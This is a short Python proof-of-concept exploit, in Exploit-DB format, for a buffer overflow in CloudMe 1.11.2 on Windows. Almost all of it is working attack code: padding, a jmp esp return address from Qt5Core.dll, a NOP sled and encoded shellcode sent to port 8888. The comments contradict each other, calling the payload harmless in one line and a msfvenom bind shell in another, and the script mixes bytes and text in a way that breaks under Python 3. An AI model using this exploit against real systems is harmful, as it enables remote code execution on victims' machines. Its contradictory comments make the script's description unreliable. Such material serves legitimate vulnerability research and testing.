# Exploit Title: CloudMe 1.11.2 - Buffer Overflow (PoC)
# Date: 2020-07-21
# Exploit Author: MTOTH
# Vendor Homepage: https://www.cloudme.com/en
# Software Link: https://www.cloudme.com/downloads/CloudMe_1112.exe
# Version: CloudMe 1.11.2
# Tested on: Windows 10 x64 (build 1909 and 1809)
# This version has been forked from the original PoC: https://www.exploit-db.com/exploits/46218
#Instructions:
# Start the CloudMe service and run the script.

import socket
import sys
import struct

target = "127.0.0.1"

padding1   = b"A" * 1052
EIP        = struct.pack("<L", 0x68f7a81b) # 0x68f7a81b : jmp esp | {PAGE_EXECUTE_WRITECOPY} [Qt5Core.dll] ASLR: False, Rebase: False, SafeSEH: False
NOP = "\x90" * 20

# The payload provided in this PoC opens the Display Settings.
# msfvenom -a x86 -p windows/shell_bind_tcp LPORT=12345 --smallest -b "\x00\x0a\x0d" -f python  --> final payload size: 224 bytes 
# Generate X86 based payloads!
# Payload size: 258 bytes
# Final size of python file: 1263 bytes


buf = b""
buf += b"\x6a\x3b\x59\xd9\xee\xd9\x74\x24\xf4\x5b\x81\x73\x13"
buf += b"\x87\x8f\x10\x90\x83\xeb\xfc\xe2\xf4\x7b\x67\x92\x90"
buf += b"\x87\x8f\x70\x19\x62\xbe\xd0\xf4\x0c\xdf\x20\x1b\xd5"
buf += b"\x83\x9b\xc2\x93\x04\x62\xb8\x88\x38\x5a\xb6\xb6\x70"
buf += b"\xbc\xac\xe6\xf3\x12\xbc\xa7\x4e\xdf\x9d\x86\x48\xf2"
buf += b"\x62\xd5\xd8\x9b\xc2\x97\x04\x5a\xac\x0c\xc3\x01\xe8"
buf += b"\x64\xc7\x11\x41\xd6\x04\x49\xb0\x86\x5c\x9b\xd9\x9f"
buf += b"\x6c\x2a\xd9\x0c\xbb\x9b\x91\x51\xbe\xef\x3c\x46\x40"
buf += b"\x1d\x91\x40\xb7\xf0\xe5\x71\x8c\x6d\x68\xbc\xf2\x34"
buf += b"\xe5\x63\xd7\x9b\xc8\xa3\x8e\xc3\xf6\x0c\x83\x5b\x1b"
buf += b"\xdf\x93\x11\x43\x0c\x8b\x9b\x91\x57\x06\x54\xb4\xa3"
buf += b"\xd4\x4b\xf1\xde\xd5\x41\x6f\x67\xd0\x4f\xca\x0c\x9d"
buf += b"\xfb\x1d\xda\xe5\x11\x1d\x02\x3d\x10\x90\x87\xdf\x78"
buf += b"\xa1\x0c\xe0\x97\x6f\x52\x34\xe0\x25\x25\xd9\x78\x36"
buf += b"\x12\x32\x8d\x6f\x52\xb3\x16\xec\x8d\x0f\xeb\x70\xf2"
buf += b"\x8a\xab\xd7\x94\xfd\x7f\xfa\x87\xdc\xef\x45\xd5\xfa"
buf += b"\x7e\xf4\xeb\xe3\x23\xa2\xa9\xea\x68\xf5\xa7\xfc\x78"
buf += b"\xf5\xeb\xe3\x23\xa2\xa9\xeb\x7c\xfc\xab\xcc\x7f\xfe"
buf += b"\xf3\xfd\x7f\xfc\xd8\xdd\x65\xfe\xc3\xc3\x5c\xb0\xe3"
buf += b"\xea\x63\xfb\xa9\xec\x60\xfc\x87\x8f\x10\x90"


padding2 = b"D" * (2000 - len(padding1 + EIP + "\x90" * 20 + buf))

payload = padding1 + EIP + NOP + buf + padding2  

try:
        s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((target,8888))
        s.send(payload)
        print(" [+] Payload with {} bytes sent!".format(len(payload)))
except Exception as e:
        print("Something bad happened. The error code was: {}".format(sys.exc_value))